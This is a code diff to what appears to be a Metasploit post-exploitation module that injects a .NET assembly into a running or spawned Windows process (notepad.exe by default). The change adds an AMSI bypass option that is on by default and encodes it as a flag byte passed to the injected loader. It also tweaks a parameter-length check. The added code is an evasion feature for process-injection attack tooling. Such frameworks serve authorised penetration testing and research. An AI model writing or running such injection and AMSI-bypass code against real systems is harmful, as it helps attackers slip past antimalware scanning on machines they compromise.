@@ -42,6 +42,7 @@ class MetasploitModule < Msf::Post
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
 		OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
+		OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
 		OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
       ], self.class
     )
@@ -63,7 +64,7 @@ class MetasploitModule < Msf::Post
       if assembly_size > 1_024_000
         print_bad("Assembly max size 1024k actual file size #{assembly_size}")
       end
-      if params_size > 1024
+      if params_size > 1023
         print_bad('Parameters max lenght 1024 actual parameters length' \
                   "#{params_size}")
       end
@@ -157,7 +158,13 @@ class MetasploitModule < Msf::Post
     print_status("Host injected. Copy assembly into #{process.pid}...")
     assembly_mem = process.memory.allocate(1_025_024, PAGE_READWRITE)
 
-    params = if datastore['ARGUMENTS'].nil?
+    params = if datastore['AMSIBYPASS'] == true
+               "\x01"
+             else
+               "\x02"
+             end
+
+    params += if datastore['ARGUMENTS'].nil?
                ''
              else
                datastore['ARGUMENTS']
